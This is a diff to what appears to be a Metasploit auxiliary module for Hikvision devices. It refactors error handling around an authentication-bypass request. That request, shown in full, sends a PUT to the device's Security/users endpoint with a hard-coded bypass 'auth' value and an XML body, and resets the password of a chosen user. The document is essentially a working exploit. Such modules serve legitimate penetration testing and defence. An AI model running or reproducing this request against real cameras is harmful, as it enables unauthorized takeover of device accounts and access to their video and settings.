@@ -103,8 +103,9 @@ class MetasploitModule < Msf::Auxiliary
           'auth' => 'YWRtaW46MTEK'
         }
       })
-    rescue Rex::ConnectionRefused, Rex::HostUnreachable, Rex::ConnectionTimeout, Errno::ETIMEDOUT => e
-      elog("A communication error occurs: #{e.message}", error: e)
+    rescue StandardError => e
+      print_error("#{peer} - Communication error occurred: #{e.message}")
+      elog("#{peer} - Communication error occurred: #{e.message}", error: e)
       return Exploit::CheckCode::Unknown
     end
 
@@ -125,18 +126,24 @@ class MetasploitModule < Msf::Auxiliary
   def run
     return unless check == Exploit::CheckCode::Vulnerable
 
-    print_status("Starting the password reset for user:#{datastore['USERNAME']} and sending the payload...")
-    post_data = %(<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">\r\n<id>#{datastore['ID']}</id>\r\n<userName>#{datastore['USERNAME']}</userName>\r\n<password>#{datastore['PASSWORD']}</password>\r\n</User>)
+    begin
+      print_status("Starting the password reset for user:#{datastore['USERNAME']} and sending the payload...")
+      post_data = %(<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">\r\n<id>#{datastore['ID']}</id>\r\n<userName>#{datastore['USERNAME']}</userName>\r\n<password>#{datastore['PASSWORD']}</password>\r\n</User>)
 
-    res = send_request_cgi({
-      'method' => 'PUT',
-      'uri' => normalize_uri(target_uri.path, 'Security', 'users'),
-      'vars_get' => {
-        'auth' => 'YWRtaW46MTEK'
-      },
-      'ctype' => 'application/xml',
-      'data' => post_data
-    })
+      res = send_request_cgi({
+        'method' => 'PUT',
+        'uri' => normalize_uri(target_uri.path, 'Security', 'users'),
+        'vars_get' => {
+          'auth' => 'YWRtaW46MTEK'
+        },
+        'ctype' => 'application/xml',
+        'data' => post_data
+      })
+    rescue StandardError => e
+      print_error("#{peer} - Communication error occurred: #{e.message}")
+      elog("#{peer} - Communication error occurred: #{e.message}", error: e)
+      return nil
+    end
 
     if res.nil? || res.code != 200
       print_error('Unknown Error. Password reset was not sucessfull!')
